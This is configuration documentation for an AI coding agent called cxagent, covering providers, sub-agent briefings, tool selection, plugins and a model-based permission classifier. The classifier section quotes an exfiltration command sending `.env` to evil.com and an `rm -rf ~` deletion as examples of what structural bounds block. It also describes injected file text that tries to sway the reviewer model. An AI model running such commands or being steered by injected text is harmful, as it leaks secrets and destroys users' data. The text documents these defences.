# Configuration

Settings live in one file, `config.json`, in cxagent's config directory. Some things sit beside it in
files of their own, each described in its section: your global `CXAGENT.md`, skills and commands, and
a repository's `.cxagent/hooks.json`.

| OS | Path |
|---|---|
| Linux, macOS | `$XDG_CONFIG_HOME/cxagent/`, or `~/.config/cxagent/` |
| Windows | `%APPDATA%\cxagent\` |

**On Linux and macOS the directory, and its `logs` folder, are set to `0700` on every start** — the
directory holds API keys, and a readable one exposes the file listing even when the file itself is
locked down. A folder left looser is tightened again on the next launch; a filesystem that refuses
`chmod` is left as it is rather than stopping the app. `config.json` is written at `0600` whenever
cxagent writes it (F8, the browser's config page, `cxagent web passwd`, the plugin manager). A
`config.json` you created yourself keeps the mode you gave it until cxagent first saves it.

**On Windows no mode is set.** The folder and its files take the access rules they inherit from
`%APPDATA%`, which in a default profile admit only you, administrators and the system.

There is no config file until you make one. [`config.sample.json`](config.sample.json) documents every
key inline, including what each one's absence means. On a first run with no config, cxagent opens the
configuration dialog to make one; after that `F8` edits it in the app, and the file is still yours to
edit by hand. The dialog writes only what you changed — every other key, including ones it does not
know, stays as it was — and it judges each save with the same rules startup uses, so it never writes a
file the next start would refuse. A file that does not parse is never overwritten: the dialog says why
and leaves it for you to fix.

---

## `{env:NAME}` and `{file:path}` — secrets kept out of the file

A few values may name where a secret comes from instead of holding it, so a config can be shared,
committed or pasted into an issue without carrying one. `{env:NAME}` is replaced by that environment
variable; `{file:path}` by that file's contents, trimmed of surrounding whitespace (an editor's
trailing newline in a key file is the classic silent 401), with a leading `~` meaning your home.

| Where | What it takes | When the value cannot be read |
|---|---|---|
| `mcp.<server>.headers` values | `{env:NAME}`, `{file:path}` | A warning at startup naming the key; the header is sent with an empty value and the server still connects |
| `mcp.<server>.env` values | `{env:NAME}`, `{file:path}` | The same: a warning, and the variable is set empty |
| `webSearch.tavilyApiKey` | `{env:NAME}`, `{file:path}` | A warning, and search stays on DuckDuckGo |
| A provider's `apiKey` | `{env:NAME}`, `{file:path}`. The variable `CXAGENT_PROVIDER_<NAME>_APIKEY` (the instance's name in capitals) replaces the whole key when set and not empty | A warning naming the provider, and no key is sent |
| An `http` hook's `headers` | `$NAME` or `${NAME}`, for names listed in its `allowedEnvVars`, in system hooks only ([below](#the-five-types)) | Read as empty, without a warning |
| An `mcp_tool` hook's `input` | `${tool_input.path}` — a field of the event, not a variable | — |

Nowhere else: not a `command`, where expanding a value into the arguments of a process it spawns would
make a config file a way to run code, and not a header name. An unset variable or an unreadable file
never stops the config loading. Every variable the file reads with `{env:NAME}` is also kept from the
model's [sandboxed commands](#sandbox--where-the-models-commands-run).

---

## `providers` — required

Named instances. The name is yours; `kind` is what cxagent knows how to talk to.

```json
"providers": {
  "local": {
    "kind": "openai-compatible",
    "model": "qwen3.6-35b-a3b-ud-iq4_xs.gguf",
    "baseUrl": "http://127.0.0.1:8771/v1",
    "contextWindow": 212992,
    "description": "the local llama.cpp model: free and private; edits, builds, searches"
  }
},
"defaultProvider": "local"
```

**`description` says what the entry is for**, in one line — what it is good at, and whether it is free
or paid. The model reads it when choosing where a sub-agent runs (see [`agents`](#agents--sub-agent-types)),
so it is worth writing for any entry an agent type lists. The Providers tab in `/config` edits it;
emptying it there removes the key.

**`contextWindow` is worth setting even though it is optional.** Without it the app cannot tell you
how full the context is — a percentage needs a denominator, and inventing one would put a confident
figure on a guess. It is also what auto-compaction measures pressure against: unset, the threshold
falls back to a fixed constant that may be far from your model's real headroom. Left unset, it is
asked of the endpoint: a llama.cpp server's `n_ctx`, or Anthropic's Models API for an `anthropic`
instance.

**`cacheControl` is prompt caching**, for endpoints that cache nothing without being asked: Anthropic,
and Anthropic or Google models behind an OpenAI-compatible gateway. An `anthropic` instance caches the
tools and system prompt and the growing conversation, so each turn reads what the last one wrote.
**On by default for `anthropic` and for an OpenRouter endpoint**, off for every other: cache writes are
billed (1.25x input for a five-minute entry), but in a tool loop the reads (0.1x) repay that from the
second request. `cacheControl: false` turns it off where it defaults on; `true` turns it on elsewhere.
A local server caches on its own and needs nothing.

**`thinking` sets how hard the model thinks** in a new session — `/think` and F10 change it for one
session ([COMMANDS.md](COMMANDS.md#think)). Which values work is the model's own answer, not a list
in cxagent:

| Instance | Levels | Sent as |
|---|---|---|
| `anthropic`, a model that accepts adaptive thinking | `low` `medium` `high` `xhigh` `max` as the model offers them, and `off` where it accepts that | `output_config.effort`; `off` is `thinking: {type: "disabled"}` |
| `openai-compatible` at `openrouter.ai` | the model's own, from OpenRouter's model list: its effort levels (`minimal` to `xhigh`) and `off`, or `off` `on` for a model with a switch but no efforts | `reasoning: {effort}`; `off` is `{effort: "none"}`, `on` is `{enabled: true}` |
| `openai-compatible` at `api.openai.com`, with `"reasoning": true` | `minimal` `low` `medium` `high` | `reasoning_effort` |
| `openai-compatible`, a llama.cpp server whose chat template takes `enable_thinking` | `off` `on` | `chat_template_kwargs.enable_thinking` |
| anything else | none — the model's own behaviour | nothing |

Unset, nothing is sent and the model decides. A level the model does not offer is said once and the
model's default used, so a config written for one model cannot break a session on another. Changing
the level on an Anthropic conversation re-sends it uncached once, because the level is part of the
cached prompt.

**`reasoning: true` marks an `api.openai.com` model as a reasoning model.** OpenAI's model list
does not say which models reason, and a model that does not refuses `reasoning_effort` outright, so
cxagent offers levels only when you say so. OpenAI does not return the reasoning text, so these
levels change how hard the model thinks without a thinking block to show for it.

**`thinkingDisplay` is `"summarized"` (the default) or `"omitted"`**, for `anthropic` instances. Claude
models that think hide the text unless asked for a summary; cxagent asks, so thinking shows in the
transcript like a local model's. `"omitted"` shows only `◆ Thought for 4s` and starts the answer a
little sooner; the cost is the same either way.

**cxagent sends adaptive thinking to every Claude model that accepts it.** Claude 5 models think by
default anyway; Claude Opus 4.6–4.8 and Sonnet 4.6 do not, and now do. Set `"thinking"` to a lower
level, or `"off"` where the model offers it, to spend less.

**Thinking from a local server shows too**, whether it arrives as `reasoning_content`, `reasoning`
or inline `<think>…</think>` text. It is shown, never sent back, and never saved. Claude's thinking
is sent back within the tool loop it belongs to, as Anthropic requires for the loop to keep thinking,
and dropped once the next message starts; it is not saved either.

**`images` says whether the model sees images**, for pasting a screenshot (Ctrl+V, or dropping a file
on the terminal). `true` sends each image to the model; `false` sends a short note in its place, so the
conversation goes on with a model that would refuse the picture. Left unset, it is asked of the endpoint
where it can say: a llama.cpp server's `/props` (`true` only when it loaded a vision projector with
`--mmproj`), Ollama's `/api/show`, OpenRouter's model list. An `anthropic` instance is `true`. Elsewhere
(OpenAI, vLLM, LM Studio) nothing says, so the image is sent; if the endpoint refuses it, the request goes
again with the notes and the model is treated as `false` from then on. Set `false` on such
a text-only model to skip that first refused try. The Providers tab in `/config` sets it, and shows what
the endpoint itself says beside your choice.

**`apiKey` can stay out of the file.** Write it as [`{env:NAME}` or `{file:path}`](#envname-and-filepath--secrets-kept-out-of-the-file)
— `"apiKey": "{env:OPENROUTER_API_KEY}"` — or set `CXAGENT_PROVIDER_<NAME>_APIKEY`, the instance's name in
capitals (`CXAGENT_PROVIDER_LOCAL_APIKEY` for the one above), which replaces whatever `apiKey` says. A
key written literally is guarded only by the file's own permissions; a placeholder or the variable is
the version that survives the file being shared.

**`maxConcurrentAgents` bounds how many sub-agents may call this endpoint at once.** Absent or `0`
means unlimited, which is the default — the same convention `maxTurns` uses.

Uncapped is deliberate: cxagent cannot discover what an endpoint tolerates, and a limit chosen
without evidence throttles everyone to guard against a problem they may not have. Set it when you
know your endpoint's shape. What uncapped costs, so the choice is informed:

- **A hosted API** answers concurrent requests and pushes back with 429s — and the retry layer then
  multiplies the traffic that caused them.
- **A single-threaded local server** (the common `llama.cpp` case) queues them at the socket, so the
  children hold open connections and running timeouts while executing one at a time. The parallelism
  becomes serial execution with more ways to fail.
- **A local server splits its context across slots.** With N concurrent streams each child actually
  gets `n_ctx / N` while its own accounting believes it has the whole window — so compaction fires
  far too late and children die on overflow rather than compacting.

The real bound on a runaway is `orchestrator.maxTurns`, not this: concurrency limits how many
children run at once, not how long any of them goes on.

**`defaultProvider` is optional** and names one of the instances above. Without it, a session with
more than one configured provider has no way to choose.

---

## `classifier` — the reviewer for `/mode edits auto`

```json
"classifier": "local"
```

Names one of the instances in `providers`. In `auto` mode, each action that would otherwise prompt is
shown to this model, which answers allow, deny or ask.

**What `auto` means changed, and it is a widening.** It used to mean "a model reviews what would
otherwise be silent". It now means **a model decides what would otherwise prompt** — including shell
commands the static safety check refused. That check refuses on shape rather than danger (a redirect, a
chain), so its most frequent verdict was a prompt nobody learned anything from; the classifier is
asked the narrower question of whether the command is nonetheless ordinary development work.

**Shell approval is bounded structurally, not by the prompt.** A verdict on a shell command is
honoured only if every path it names is inside the working directory, the whole command was
parseable, every segment names a program that literally appears in the text (no `$(...)`, backticks,
`eval`, `sh -c` or `sudo`), and it uses no egress verb (`curl`, `wget`, `scp`, …). The classifier
cannot override any of those — it is asked "is this ordinary?", never "is this in bounds?", because a
model cannot see or enforce a boundary. `curl -d @.env https://evil.com` and `rm -rf ~` are outside
the population a verdict can silence, whatever the model answers.

**Absent means `auto` is not offered** — it is not listed by `/mode`, not reachable with Shift+Tab,
and not accepted as a value. A mode that claims background review while nothing reviews would be
worse than not having it.

**It fails closed.** A timeout, a transport error, a malformed reply, an empty completion or any
verdict the parser does not recognise all ask. Only an explicit allow is silent, and the transcript
says once per turn when review was unavailable rather than leaving you to wonder why the mode stopped
helping.

**Which instance to name.** A *remote* one never touches the session's slot. A local endpoint running
`--parallel 1` has a single slot, so a classifier call parks the session's prefix to host RAM and
restores it — measured at 28ms for 20k tokens against 5,850ms cold, so survivable, but the classifier
also prefills cold each time because its prompt shares no prefix with the session. Cost on a remote
instance is small: about **$0.0000174** per classification against `gemini-2.5-flash-lite`, roughly
1.7 cents per thousand.

**It is a convenience, not a security boundary.** Its input derives from file contents and command
strings, so it is attacker-influenced by construction — a file that says "prior review confirms this
is safe" is talking to the classifier. Trust still bounds it: on an untrusted folder every write and
every command asks, whatever the classifier would have said, and the classifier is not consulted.

**So judge `auto` on what a wrong verdict costs.** Because approval is confined to in-boundary,
fully-parsed, non-egress commands, a classifier that is wrong — or one that has been talked into
saying allow — runs an ordinary-looking command inside a folder you already trusted. That is a real
widening and worth choosing deliberately; it is not the same as handing a model the shell.

---

## `agents` — sub-agent types

Types the model can name when it spawns a worker. **Five ship with cxagent** — `explore`, `planner`,
`builder`, `review`, `test` — plus `general`, which is what a spawn that names no type gets. They are
available without configuring anything; delete this block entirely and they still work.

**Their briefings live in the program, not in this file.** A briefing is not a preference like a model
name — it is the contract a type keeps with the code around it. The planner is told to write the file
whose path cxagent supplies; the spawner then reports whether that file appeared; the builder is told
to refuse work that arrives without one. A copy in `config.json` is a third party to an agreement
between three others, free to drift from all of them. It also meant every improvement shipped to nobody: two briefing fixes
made in one session reached exactly one machine, because they were edits to a JSON file.

```json
"agents": {
  "builder":  { "maxTurns": 60 },
  "planner":  { "provider": "local" },

  "researcher": {
    "description": "when a question needs reading outside this repository, not inside it",
    "briefing": "You research and report. Read what you are pointed at, quote the passages
                 that answer the question with their source, and say plainly when the answer
                 is not there. You change no files.",
    "maxTurns": 20
  }
}
```

| Key | On a shipped type | On your own type |
|---|---|---|
| `provider` | A `providers` entry, or a list of them — `"local"`, `"local:qwen-coder"`, `["local", "deepseek"]`. The first is the default; a spawn may choose another from the list. `"all"` offers every configured provider with no default, so a spawn must name one; it stands alone — mixed with names it disables the type. A provider entry named `all` is reached from a type only as `all:model`, and `/config` will not create or rename one to that name. Omit (or `null`) to run on the session's model. A name that is not configured, or a `:model` that is not the entry's, disables the type with a warning. | Same. |
| `maxTurns` | Absent inherits the type's shipped default, then the session ceiling; `0` is unbounded. | Absent inherits the session ceiling. |
| `briefing` | **Ignored, with a warning at startup.** | Required. |
| `description` | **Ignored, with a warning at startup.** | Optional, and worth writing. |

**`general` is the default child** — what a spawn that names no type gets — and takes `provider`,
`maxTurns` and `tools` with no briefing at all: `"general": { "provider": "local" }` moves every plain
sub-agent to that instance. A `briefing` on it is optional, and becomes a standing instruction every such
child is given.

**A spawn may choose among a type's providers.** The model sees each type's providers with their
descriptions and may pass `provider` to pick one; anything the type does not list is refused. Give each
provider entry a `description` — what it is for, what it costs — since that line is what the choice is
made by. In `/config`, the Agents tab edits the list (add, remove, reorder; the first is the default, and
"Any provider" saves `"all"`), and `/agents` shows it. Where a child runs shows wherever it appears: its
row in the conversation, its card on the F7 tasks board, its agent tab's header, and any permission
prompt it raises.

**A spawn may also name a `root`**, a folder under the session's own — a git worktree made there, say —
and the child works there: its file tools, shell and relative paths are judged against that folder,
while the project's trust, mode and stored rules still apply (a stored rule can still permit a path
outside the child's folder). A root outside the session's folder, or inside `.git`, `.vscode`,
`.claude`, `.idea`, `.github`, `.husky`, `.devcontainer` or `.cxagent` — folders whose files can run code — is
refused. Where it works shows beside
where it runs.

Ignoring loudly is deliberate. An edit that does nothing and says nothing is the worst of the three
options — silently winning restores the drift, silently losing leaves you debugging a change that was
never applied. If you want different text, give the type a name cxagent does not ship: any name that
is not built in is entirely yours, exactly as before.

**`description` and `briefing` are for different readers, and neither is derived from the other.**
The briefing goes to the CHILD in full, as the highest-authority text in its prompt. The description
goes to the PARENT, as one line in the spawn tool's catalog — the only thing the model sees before
choosing a type. It is the same split skills use, for the same reason: *the description is the entire
interface.*

Write the situation, not the job. *"when finding something means reading across several files"* helps
a chooser; *"searches files and reports what it found"* describes an agent that is already chosen.

Without a description the catalog says `runs where you do, no special instructions` — the same line a
type with no briefing gets. It does NOT fall back to the briefing: that was the old behaviour, and it
produced rows like `You search and report.`, which is written in the second person for the child and
tells a chooser nothing. The honest answer for a type nobody described is that nothing was said.

Every shipped type has one, and they run to a few sentences each. Length is not capped — say when to
reach for it AND what comes back, because a parent is deciding what to plan around as well as whether
to delegate. The bound worth respecting is the spawn tool's own guidance above the catalog: the
shipped five total about 1,600 characters against its ~2,150, so they inform without burying it.

**A type's provider brings its own context window.** They resolve together, deliberately: a child
given one provider and another's window never sees pressure, never compacts, and dies on an overflow
rather than degrading.

**`maxTurns` is a backstop, not a budget.** Seen live: an `explore` child capped at 30 turns spent all of them
hunting a JSON schema that is not published anywhere, then filled its last few re-reading local
files. The cap stopped it, the parent was told `capped`, and the session carried on — but the fix was
the briefing, not the number. A give-up clause would have returned a useful answer at turn 15.
`/stats` counts capped runs apart from failures for exactly this reason.

Unknown type names are refused rather than silently treated as `general`: substituting the default
would mean the briefing did not apply and nobody was told.

### `planner` and `builder` — a pair

The sample defines two types that work together. **The planner writes a plan to `./plans/` and
returns the path**; the parent hands that path to a **builder, which reads it and implements it —
and refuses to start without one.**

The path matters more than it looks. A plan returned as text lands in the parent's context and again
in the builder's, so it is paid for twice and stays resident for the rest of the session. A path
costs a line. This is the same reason Claude Code's own multi-agent workflow passes plan files rather
than plan text.

**The builder stopping is the point.** Nothing prevents an agent from inventing a plan when none
arrives — a briefing is a request, not a permission — but a type whose first instruction is "stop and
say you were given no plan" turns the most likely failure into a loud one instead of a silent
rewrite. A builder that quietly plans its own work looks like progress and is not.

**Neither type is required, and there is no plan mode.** A plan can come from the planner, from you
in conversation, or from a file you wrote by hand — the builder never has to know which. `/mode work
plan` therefore answers "not settable yet": what makes an agent plan well is its briefing, and
briefings already compose.

`plans/` is gitignored. A plan is a working note for a task in flight; one worth keeping belongs in
`docs/` under a name you chose.



### What each shipped type is told

Reproduced so a bad run can be debugged without reading source — or run **`/agents <name>`**, which
prints the same text from the running session. `cxagent/Core/Agent/BuiltinAgentTypes.cs` is the
source of truth for both.

#### `explore`

*Catalog line (inherits the session ceiling):* when answering means reading across several files and you want the conclusion rather than the file dumps. Give it a question, not a location. It returns exact paths as file_path:line_number and says plainly when the thing does not exist — a confident negative is a real answer. It does not edit anything. USE THE PLANNER INSTEAD when what you want back is a design rather than a fact: a planner reads code too, so sending an explorer to plan something gets you a report about the code as it is, which is not a plan and cannot be built from. WHEN YOU PASS ITS FINDINGS ON, put them in `context`, not in the prompt — context stays with the next agent for its whole run, a prompt does not survive a long one, and an agent that loses the facts you gave it goes and reads the same files again.

> You search and report. Find what was asked for, give exact paths as file_path:line_number, and say what you actually saw rather than what you expect to be true. Do not edit anything. If the thing asked for does not appear to exist, say so and say where you looked — a confident negative is an answer, and is worth more than more searching. Before you report a path, check it against what you actually opened.

#### `review`

*Catalog line (inherits the session ceiling):* when you want code checked for correctness — logic that is wrong rather than style that is unusual. Best on a diff or a named set of files. It returns specific objections with a failing case behind each one, and says plainly when something is fine rather than inventing concerns.

> You review code for correctness. Look for logic that is wrong rather than style that is unusual, and say plainly when something is fine. An objection with no failing case behind it is noise.

#### `test`

*Catalog line (inherits the session ceiling):* when tests need running and a failure needs diagnosing. It reads the actual output before drawing a conclusion — a command that exits 0 has not necessarily verified anything, and a filter that matched nothing exits 0 too — and reports the counts it saw rather than the counts it expected.

> You run and diagnose tests. Read the actual output before drawing a conclusion — a command that exits 0 has not necessarily verified anything, and a filter that matched nothing exits 0. Report the counts you saw.

#### `planner`

*Catalog line (inherits the session ceiling):* when the change should be thought through before any of it is written, or when you are not sure the request is possible as asked. IT DOES ITS OWN READING — you do not need to explore first, and sending an explorer to design something gets you a description of the code rather than a plan for changing it. BUT IF YOU HAVE ALREADY EXPLORED, hand what was found to it in `context` rather than the prompt: otherwise it re-reads the whole codebase to rediscover what you already knew, and may spend its run doing that instead of writing the plan. It reads enough to be specific and writes the plan to a file whose path cxagent gives it — the result tells you that path, or tells you plainly that no plan was written. Its answer covers what the change is, the steps in order, which step is most likely to be wrong, and anything it found that changes the shape of the work — including a reason it cannot be done as asked. It changes nothing else.

> Your one deliverable is a plan FILE, and its path is given to you — your context names the exact path to write, and that is the file the parent reads. Write it with write_file before you finish. Do not choose a different name or a different directory: nobody looks there. Your answer is a briefing about the plan, not the plan itself. A run that investigates well and ends without that file has failed, however good the reading was: whoever asked has nothing to build from, and nothing to review. If you find yourself about to stop, check first that you have written it. IF A READ FAILS, FIND THE FILE — never assume what is in it. A path that does not resolve means you guessed the location, not that the thing is absent: glob or grep for the name before concluding anything. A plan built on assumptions is worse than no plan, because it reads exactly like one that was checked. Never write a step against a file you have not read, and if you genuinely cannot find something, say so in the plan instead of inventing around it. READ ONLY UNTIL YOU CAN BE SPECIFIC, then stop and write. You do not need to understand the whole codebase; you need to name the files that must change and what each change is. When you can do that, you are done reading — further reading is not making the plan better, it is postponing it. In the file: what the change is and why it takes that shape, the steps in the order they can be made without breaking the build in between, which step is most likely to be wrong and what would prove it early, and anything you found that changes the shape of the work — an existing mechanism to reuse, a constraint the code imposes, or a reason the request cannot be done as asked, which is the most valuable thing you can report and the easiest to leave out. Write for someone who cannot ask you anything: exact paths, and quote the identifiers a step depends on rather than describing them. A step nobody could carry out without asking you a question is not finished. Then answer properly. The FILE is the instruction for whoever builds; your ANSWER is the briefing for whoever decides whether to spend a build run at all — so give them the several paragraphs you would give a colleague who asked "so what are we doing?": what the change is, the steps in order with the file each one touches, what is most likely to be wrong, and what you found that changes the work. A path with no explanation is not an answer. You change nothing except the plan file.

#### `builder`

*Catalog line (inherits the session ceiling):* when a plan already exists and you want it carried out — pass the plan's path or its text in context. It follows the plan in order without re-deciding it, verifies each step before moving on, and stops to ask rather than substituting its own approach when a step is wrong. It refuses to start if no plan reaches it.

> You implement a plan that already exists — you never write one. The plan reaches you as a path to read, or as text in your context. IF NEITHER IS PRESENT, STOP IMMEDIATELY and report that you were given no plan. Do not infer one from the task description, and do not start work to see how far you get: a builder that invents its own plan is the failure this type exists to prevent, and it is worse than doing nothing because it looks like progress. CHECK THAT WHAT YOU WERE GIVEN IS A PLAN. A plan names the steps in the order they can be carried out; a report describes code as it currently is. If you were handed a description of the codebase rather than a sequence of changes, with no ordered steps and no path to a plan file — say so and stop. This is not hypothetical: a parent that meant to spawn a planner and typed the wrong agent type gets an explorer's report back, calls it a plan, and hands it to you. Building from it produces confident work nobody designed. Follow the plan in the order written and do not re-decide it: if a step is wrong, or cannot be carried out as written, stop and say which step and why rather than substituting an approach nobody asked for — the plan may encode a constraint you cannot see, and a plan silently improved is a plan nobody reviewed. DO THE STEPS IN THE PLAN AND STOP. Work the plan does not name is not yours to do, however obviously it follows: if carrying out the plan reveals more that is needed, finish what the plan says, then REPORT what else you found and let whoever asked decide. A builder that keeps going until the feature feels complete has written its own plan after all — and it does so file by file, so nobody notices until the diff is far larger than what was agreed. Make each change, then run what proves it before moving on: a step whose verification you skipped is a step you have not finished. BUILD AS SOON AS THERE IS SOMETHING TO BUILD — the first file, not the last. Two measured runs wrote code for fifty-five turns and thirty-two turns respectively before compiling once, and both times the first build reported something trivial that had been wrong the whole way: a type whose members had been invented, and a missing import. Errors are cheap alone and expensive in a pile, because each one you find late may have shaped the code written after it. Report what you actually ran and what it said. Name any step you did not complete and why, and never report success for work you did not verify — a wrong 'done' is worse than a clear 'stuck'.

## `tools` — what an agent is offered

Every agent gets every built-in tool unless something narrows them. A **selection** is a list of terms
saying which it should have:

```json
"llmAgent": { "tools": ["inherited", "-run_shell", "-write_file"] }
```

That is a session that reads and searches but never writes or shells out. Absent, nothing is
narrowed — the default is unchanged and this key is one you can ignore entirely.

F8's **General** tab edits `llmAgent.tools` — the session's agent — as a base and the built-in tools as
boxes; the **Agents** tab does the same for each type's `tools`.

### The terms

| Term | Means |
|---|---|
| `inherited` | Start from what the level above offers. Only the FIRST one in a selection does anything; a second is a no-op. |
| `all` | Start from everything, discarding what an outer level narrowed. |
| `read_file` | A bare name is a whitelist: name every tool you want. |
| `-run_shell` | Remove one tool from whatever is in force. |
| `+run_shell` | Add one back that an outer level removed. |

`["inherited", "-run_shell"]` is the common shape: everything I would normally get, minus one.
`["read_file", "grep", "glob"]` is the other: exactly these three and nothing else.

**`+` can reopen what a wider level closed.** That is deliberate, and it is safe for one reason: a
selection is only ever written in config or in code, never by a model. A narrowed agent cannot widen
itself by asking.

### The four levels

They compose outward-in, each applied to what the one before it left:

| Level | Where | Scope |
|---|---|---|
| **S1** | `llmAgent.tools` here, or in code when embedding | The session's agent, for its whole life |
| **S2** | The embedding application, per session | One session |
| **S3** | Per turn, in code | One request |
| **S4** | `agents.<type>.tools` | Every child spawned as that type |

```json
"agents": {
  "explore": { "tools": ["inherited", "-write_file", "-replace_in_file"] }
}
```

A shipped type may set `tools` even though it may not set `briefing`. The two are different kinds of
thing: a briefing is text the code depends on, while a toolset is a property of **your** deployment,
which cxagent cannot know.

### The built-in names

`read_file` · `write_file` · `replace_in_file` · `glob` · `grep` · `run_shell` · `web_fetch` ·
`web_search` · `http_request` · `todowrite` · `ask_user` · `agent` · `agent_send` ·
`task_list` · `task_stop` · `task_output` · `skill` · `memory` · `colleague`

A name that matches nothing is not an error and not a warning: names arrive late — a skill appears,
an application injects a tool — so a term matching nothing today may match tomorrow, and an
unmatched name grants nothing either way. A malformed term (`*run_shell`) IS warned about at startup
and dropped, because the grammar is checkable and a bad term would otherwise open a session cleanly
and fail every turn of it.

### What a selection does not reach

**MCP tools are never narrowed.** Each server's `enabled` flag is its control, and it is a better
one: servers connect asynchronously, so a selection resolved before a handshake finished would
silently drop tools that arrived a moment later.

**The permission gate still applies to everything offered.** Selection decides what an agent HAS;
permissions decide what it may DO with it. Narrowing is not a substitute for the gate, and the gate
is not a substitute for narrowing.

**A withheld tool is refused, not hidden.** Call one by name and the answer is "not available" —
distinct from "no such tool", which is what a typo gets. The distinction matters to a model: one
means stop, the other means try a different name.

### Things it changes that are easy to miss

- **The system prompt.** Sections teaching delegation or asking are dropped when `agent` or
  `ask_user` is withheld, and tool descriptions stop pointing at tools you do not have.
- **`/skills` and `/agents`** say so when the tool that reaches them is not offered.
- **Fan-out mode falls back to single** if `agent` is withheld, and says so once. Leaving the mode
  set while nothing can delegate would keep `/mode` and reality disagreeing for the session's life.
- **A planner gets no plan path** if it cannot write, rather than being told to write a file it
  cannot create.

### Set it once per session

An S3 selection that changes between requests rewrites the cached prompt prefix each time it does.

Measured against a local llama.cpp server, 2,800-token prompt:

| Run | cached | processed | prompt eval |
|---|---|---|---|
| Prompt unchanged, conversation grows | 2,824 | 28 | **66 ms** |
| Prompt changed | 0 | 2,830 | **773 ms** |

**The change was appended to the END of the system prompt and still cost the whole prefix.** A
prefix cache matches from token zero and stops at the first difference, so moving volatile text
later in the prompt saves nothing — the conversation trails the system message either way. On a
long session this is the difference between paying for one turn and paying for all of them: an
earlier drive measured 67,367 tokens and about 21 seconds reprocessed for a 134-character change at
turn 82.

S1 and S2 are fixed for the agent's life, so the gated text is byte-identical every turn and none of
this applies — verified on a five-turn drive where the system prompt hashed the same each time. It
is correct either way, and a caller who varies S3 asked for the difference. But if the narrowing is
a property of the session rather than of one request, S1 or S2 costs nothing.

## `mcp` — servers

```json
"mcp": {
  "context7": { "command": ["npx", "-y", "@upstash/context7-mcp"], "enabled": true },
  "remote":   { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer {env:TOKEN}" } }
}
```

`command` is argv — no shell, so no pipes, globs or redirection. An HTTP server uses `url` instead,
and may carry `headers`. Optional per server: `enabled` (default true), `cwd`, `env`, `timeoutMs`.
Values in `headers` and `env` may read [`{env:NAME}` and `{file:path}`](#envname-and-filepath--secrets-kept-out-of-the-file);
`command` never does.

A server's own usage instructions, when it sends any, are appended to the system prompt **attributed
to it by name**, so the model can tell that advice apart from cxagent's own.

`/mcp reload` re-reads this block and reconnects, for a file you edited by hand — which is what makes
an `mcp` change take effect without restarting. Adding a server does not need a restart.
`/mcp login <server>` runs OAuth for a server that returned 401 and stores the token at `0600`,
never in the config file.

---

## `plugins` and `pluginPaths` — plugins

```json
"pluginPaths": ["~/src/my-plugins"],
"plugins": {
  "csharp-lsp": {
    "file": "csharp-lsp.dll",
    "enabled": true,
    "settings": { "server": "csharp-ls", "args": [] }
  }
}
```

The plugin manager's **Sources** row (F2) edits `pluginPaths`: add, remove and reorder, each searched at
once without a restart.

The plugin manager (F2, `/plugin browse`) writes these for you when it installs a plugin; this is what
it writes.

| Key | What it takes |
| --- | --- |
| `file` | the entry-point filename — a name, not a path, found in the folders below. Required. |
| `enabled` | default true. Whether the plugin loads at startup — and only that: `/plugin load <name>` still loads a disabled one for this session. `/plugin enable` and `/plugin disable` flip it, and disabling also unloads a plugin that is running. |
| `settings` | handed to the plugin verbatim; cxagent does not read it. The plugin's own page says what it takes. |

**Where cxagent looks:** each `pluginPaths` entry in order, then the `plugins` folder beside this
config, then `<project>/.cxagent/plugins` — so a plugin you installed wins over a repository's file of the
same name, and a cloned project cannot stand in for it. A relative
`pluginPaths` entry resolves against **the project directory**, not the config folder; an absolute
path or `~` means what it says. Each folder is searched itself and one level down, so
`plugins/csharp-lsp/csharp-lsp.dll` is found the same as a loose file — and **a folder of its own is
the layout to prefer**: a plugin's identity is a hash over everything in its folder, so two plugins
sharing one re-ask each other's load prompt whenever either changes.

**No config can pre-approve a plugin.** Loading one asks — before any of its code runs, from what its
sidecar declares — showing a hash of everything it would load, and asks again when a byte of that
changes; `enabled` decides when the question comes, never its answer.

A plugins folder inside a repository is a folder your tools read too: some language servers index a
plugin binary sitting in `.cxagent/plugins`. Prefer the global folder unless a plugin belongs to one
project.

**A plugin's folder holds what you approve.** A plugin folder holding a link that points outside it — or a
loop of links — is refused, naming the link, gate or no gate: the hash you approve covers the folder, and
code reached through such a link would run without it. A link inside the folder is fine, and so is a plugin
folder that is itself a link (a dev build linked into `plugins/`); removing such a plugin removes the link
and leaves the build.

---

## `stores` — other plugin catalogs

```json
"stores": [
  { "name": "acme", "url": "https://tools.acme.example/cxagent/catalog.json" }
]
```

The plugin manager's **Sources** row (F2) adds and removes stores too, with the same checks; removing one
asks first.

A store is somebody else's plugin catalog, listed beside the official one in the plugin manager and
reachable by `/plugin get`. `/plugin store add <name> <url>`, `remove` and `list` edit this list for you;
`add` reads the catalog once first and saves nothing if it cannot.

| Key | What it takes |
| --- | --- |
| `name` | lowercase letters, digits and `-`, 1–32 characters; not `cxagent`, which is the official catalog, and not the name of a plugin already installed or in the official catalog. |
| `url` | the store's `catalog.json`: `https://`, or `http://localhost` / `http://127.0.0.1` for a store under test. |

**This file only.** A project cannot add a store; a store is somewhere plugins are listed from, and only
you decide where that is.

**A store's plugins are always `store/name`** — `acme/jira-search` — in `/plugin get`, `/plugin load`,
the plugin manager and the `plugins` block, where the key is `acme/jira-search` and `file` is the bare
file name. A plain name always means the official catalog. A store's plugins install to
`plugins/<store>/<name>/`, every download is checked against the store's own sha256, and loading one asks
exactly as any other plugin does. Removing a store leaves its installed plugins working; they stop
getting updates.

Each catalog is cached on its own (`catalog-cache-<name>.json` beside this file), so a store that cannot
be reached shows its last good copy and a note naming it, and never holds up the others. To run a
store, see `cxagent store build` in the SDK's publishing guide.

---

## `theme` — colours

```json
"theme": "Ocean"
```

The theme cxagent starts in. **Absent means `cxagent`** — its own palette, a near-black ground with a
warm amber accent. Names are matched case-insensitively, so `ocean` finds `Ocean`.

**A name that matches nothing falls back rather than failing.** Which themes exist is a question only
the window system can answer, and it does not exist when this file is read — so an unknown name is
resolved at startup and quietly replaced with the default. A misspelt colour scheme is not worth
refusing to start over.

Run `cxagent --help` to see what is installed; `--theme <name>` overrides this key for one run.

## `shellDetachOnTimeout` — what a slow command gets

```json
"shellDetachOnTimeout": false
```

F8's **General** tab sets it too: *Hand it to the background* or *Kill it at the timeout*.

What happens to a `run_shell` command still running when its `timeout_seconds` passes. **Absent means
`true`**: the command is handed over alive — the call stops waiting and comes back with the pid and the
file its output is going to, and the agent is told the exit code when it arrives. `false` kills it
at the deadline instead.

**True by default because the deadline is usually the caller's patience, not a limit on the work.** A
build or a test suite that overran two minutes is still doing something useful, and killing it throws
that away and invites the agent to run it again from the start.

